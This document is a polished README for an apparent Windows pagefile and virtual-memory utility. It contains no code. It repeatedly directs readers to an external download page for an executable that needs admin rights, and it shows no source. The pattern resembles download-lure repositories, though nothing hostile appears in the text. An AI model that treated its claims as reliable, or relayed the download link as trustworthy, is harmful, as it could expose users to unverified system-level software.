<div align="center">

<img src="assets/banner.svg" width="100%" alt="Virtual RAM Creator banner"/>

# virtual-ram-creator-utility 💾⚡

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Turn idle disk space into usable memory headroom — in a few clicks, not a few registry edits.*

<p align="center">
  <a href="https://Daimyoofpalace.github.io/virtual-ram-creator-utility/">
    <img src="https://img.shields.io/badge/GET_STARTED-Download-059669?style=for-the-badge&logo=windows&logoColor=white&labelColor=047857" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 🧠 Overview

**virtual-ram-creator-utility** is a focused Windows tool for creating and managing virtual RAM — the paging/swap capacity your system borrows from disk when physical memory runs tight. Rather than digging through System Properties, Advanced Settings, and half-remembered dialog boxes, you get a single clean interface that shows exactly how much virtual memory you have, how much you're about to allocate, and what that means for your machine.

This project exists because virtual memory configuration in Windows has barely changed in twenty years, but hardware and workloads have. Developers running multiple containers, gamers with texture-hungry titles, and low-RAM laptop owners all hit the same wall: "Not enough memory" errors that a properly sized pagefile could prevent. Virtual RAM Creator Utility exists to make that fix approachable for everyone — not just people comfortable editing `pagefile.sys` settings by hand.

It's built for three kinds of people: power users who want faster control over paging configuration, everyday users who just got a memory warning and want a safe fix, and IT folks who need to standardize virtual memory setup across several machines without writing a script every time. No matter which camp you're in, the workflow is the same — open it, size it, apply it.

<p align="center">

<a href="https://Daimyoofpalace.github.io/virtual-ram-creator-utility/">
    <img src="https://img.shields.io/badge/GET_STARTED-Download-059669?style=for-the-badge&logo=windows&logoColor=white&labelColor=047857" width="550" alt="Download"/>
  </a>

</p>

> [!NOTE]
> Virtual RAM is not a substitute for physical memory — it's disk-backed overflow capacity. It helps most when you're a few hundred megabytes short, not when you're gigabytes short.

---

## 🔧 What It Actually Does

- **Smart size recommendations** — the utility reads your installed RAM, current disk free space, and workload hints to suggest a virtual memory size instead of leaving you to guess a number.

- **One-click pagefile resizing** — adjust the paging file size on any drive without opening Control Panel, restarting Explorer, or hunting through nested settings windows.

- **Multi-drive allocation** — split virtual memory across multiple physical or logical drives, useful when your system disk is an SSD you'd rather not fill up with swap data.

- **Live memory dashboard** — a real-time view of physical RAM usage, committed memory, and current pagefile consumption, updated continuously while the app is open.

- **Safe rollback point** — every change is snapshotted before it's applied, so a size that turns out to be wrong is one click away from being undone.

- **Profile presets** — save configurations like "Gaming," "Development," or "Low-Spec Laptop" and switch between them instead of re-entering numbers each time.

- **Startup impact estimate** — a quick readout of how a chosen pagefile size may affect boot time and drive wear, so you're deciding with information, not guesswork.

- **Portable-friendly mode** — runs without a persistent background service, so it doesn't sit in your tray or autostart list unless you tell it to.

> [!TIP]
> If you're not sure where to start, let the recommendation engine set the initial number first, then fine-tune from there. Most users never need to touch the advanced sliders.

---

## 🚀 Getting Started

1. Visit the landing page using the **Get Started** button below and download the latest build.

2. Run the executable — no setup wizard, no bundled toolbars, no background installer.

3. Let the app scan your current memory and disk configuration (takes a few seconds).

4. Review the suggested virtual RAM size, adjust if needed, and apply.

> [!IMPORTANT]
> A restart is recommended (not always required) after resizing the pagefile for changes to fully take effect across all running processes.

---

## 🖥️ System Requirements

| Requirement | Details |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| RAM | 2 GB minimum, 4 GB recommended |
| Disk | 50 MB free for the app, plus space for your chosen virtual RAM size |
| Dependencies | None — fully standalone, no runtime installs required |
| Admin rights | Required, since pagefile changes are a system-level operation |

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square) ![Build](https://img.shields.io/badge/build-passing-success?style=flat-square) ![Arch](https://img.shields.io/badge/architecture-x64-lightgrey?style=flat-square)

---

## ⚙️ How It Works

The tool follows a simple, predictable pipeline every time you make a change:

1. **Scan** — reads current RAM capacity, pagefile size, and drive free space.
2. **Recommend** — calculates a suggested virtual memory size based on that scan.
3. **Preview** — shows you exactly what will change before anything is written.
4. **Apply** — commits the new pagefile configuration through the Windows memory manager.
5. **Verify** — confirms the change took effect and reports the result back to you.

```mermaid
flowchart LR

Scan --> Recommend

Recommend --> Preview

Preview --> Apply

Apply --> Verify
```

> [!WARNING]
> Applying an extremely large virtual RAM size on a nearly full drive can leave insufficient space for Windows updates. The preview step will flag this before you commit.

---

## 🩺 Troubleshooting

<details>
<summary><strong>The app says my pagefile size wasn't applied. Why?</strong></summary>

This usually happens when another process is holding a lock on the current pagefile, or a Group Policy setting on managed/corporate machines is overriding manual changes. Try applying again after closing memory-heavy applications, or check with your system administrator if the machine is domain-joined.

</details>

<details>
<summary><strong>My PC feels slower after increasing virtual RAM. Is that normal?</strong></summary>

Yes, to a degree — virtual memory lives on disk, which is far slower than physical RAM. If you're relying heavily on a large pagefile, that's often a sign the real fix is more physical memory, not a bigger virtual allocation.

</details>

<details>
<summary><strong>Can I set virtual RAM on an external or removable drive?</strong></summary>

Technically yes, but it's not recommended. If the drive disconnects, Windows can behave unpredictably since it may be actively swapping data to that volume.

</details>

<details>
<summary><strong>Do I need to disable Windows' automatic pagefile management first?</strong></summary>

The utility handles this for you — when you apply a custom size, it automatically switches the relevant drive out of "System managed size" mode.

</details>

<details>
<summary><strong>Why does the recommended size change between scans?</strong></summary>

The recommendation engine factors in current free disk space and recent memory usage patterns, so it can shift slightly as your system state changes between scans.

</details>

<details>
<summary><strong>Is a restart always required after applying changes?</strong></summary>

Not always. Reducing pagefile size or adding a new one on a secondary drive often takes effect immediately. Resizing the system drive's pagefile is the case most likely to need a restart.

</details>

---

## 🎛️ UI, UX & Keyboard Shortcuts

The interface is intentionally minimal — one main window, one dashboard, no nested settings mazes. It supports light and dark themes (auto-detected from your Windows theme by default), and every numeric field accepts both typed values and arrow-key increments.

| Shortcut | Action |
|---|---|
| `Ctrl + N` | Start a new virtual RAM configuration |
| `Ctrl + S` | Apply and save current settings |
| `Ctrl + Z` | Roll back to the previous pagefile configuration |
| `Ctrl + R` | Re-scan RAM and disk state |
| `Ctrl + D` | Toggle dark / light theme |
| `Ctrl + P` | Open saved presets |
| `F5` | Refresh live memory dashboard |
| `Esc` | Close preview / dialog without applying |
| `Ctrl + Shift + L` | Open the change log |

> [!TIP]
> Hold `Shift` while dragging the size slider for fine-grained 1 MB increments instead of the default 64 MB steps.

---

## 🤝 Contributing & Community

Contributions, bug reports, and feature ideas are genuinely welcome — this project has grown steadily because of community input, not despite it.

- Open an issue for bugs, with your Windows version and drive layout if relevant.

- Propose features via a discussion thread before opening a large pull request.

- Keep PRs focused — one fix or one feature per PR makes review much faster.

- Be respectful in issues and discussions; this is a low-drama, high-signal community.

> [!NOTE]
> Documentation improvements and translation help are just as valuable as code contributions.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026. Use it, fork it, build on it — just keep the license notice intact.

---

## ⚠️ Disclaimer

This utility modifies system-level memory settings. While every change is previewed and reversible through the built-in rollback point, you are responsible for reviewing settings before applying them, especially on production or work-managed machines. The maintainers provide this software "as is," without warranty of any kind.

---

<p align="center">

<a href="https://Daimyoofpalace.github.io/virtual-ram-creator-utility/">
    <img src="https://img.shields.io/badge/GET_STARTED-Download-059669?style=for-the-badge&logo=windows&logoColor=white&labelColor=047857" width="550" alt="Download"/>
  </a>

</p>